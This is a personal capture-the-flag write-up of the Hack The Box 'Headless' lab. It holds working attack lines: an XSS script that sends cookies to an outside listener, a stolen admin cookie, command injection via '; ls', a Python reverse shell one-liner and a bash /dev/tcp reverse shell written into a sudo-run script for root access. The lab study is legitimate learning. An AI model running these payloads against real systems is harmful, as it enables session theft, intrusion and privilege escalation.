Initial Info:
    * NMAP scan results:
        - 22/tcp  open  ssh  OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
        - 5000/tcp  open  upnp?

    * Dirbuster results:
        - http://headless.htb:5000/dashboard (CODE:500|SIZE:265)
        - http://headless.htb:5000/support (CODE:200|SIZE:2363)
    
    * Web Technologies:
        - flask 2.2.2
        - python 3.11.2

1. Cookie stealing on headless.htb:5000/support form:
    a) placing script in user agent and message field
        - COOKIE_STEAL_SCRIPT$ <script>var i=new Image(); i.src="http://10.10.14.154:8001/?cookie="+btoa(document.cookie);</script>
        - lISTENER_COMMAND$ python -m http.server 8001
        - STOLEN_COOKIE$ is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

2. gaining access to console with reverse shell via burpsuite on headless.htb:5000/dashboard:
    a) used burpsuite interceptor to input stolen cookie to access website date/time formated form
    b) appended "; ls" to end of date formated input through burp repeater to test command and it outputed files from system
    c) used reverse shell website and found a python format that worked and gave me access to the console
        - REVERSE_SHELL_CMD$ export RHOST="10.10.14.104";export RPORT=2357;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
        - LISTENER$ nc -lvnp 2357
    d) found user flag in a text file

3. privledge escalation through syscheck command:
    a) ran "sudo -l" and found syscheck command that requires no password
    b) cat out syscheck file and showed that it is running initdb.sh file
    c) used reverse shell website again in bash format and echo'd it into initdb.sh with my own ip
        - $ echo "sh -i >& /dev/tcp/10.10.14.104/6543 0>&1" > initdb.sh
        - LISTENER$ nc -lvnp 6543
    d) "sudo syscheck" ran initdb.sh with elevated privledges without needing a password
        - gained root shell through listener
    e) found root flag in /root in text file


Questions/Observations:
    1. why did inputting cookie steal script in user agent and message field work but one or the other didn't
    2. when editing initdb.sh, replacing just ip with own ip seemed to connect but nothing would output
        - other formats from reverse shell website would do same thing, the format listed in 3c was only one to output with "#" prompt
    3. there was no password when running "sudo -l" and there is when running it on my own system, is this due to hackthebox permissions that are set up?
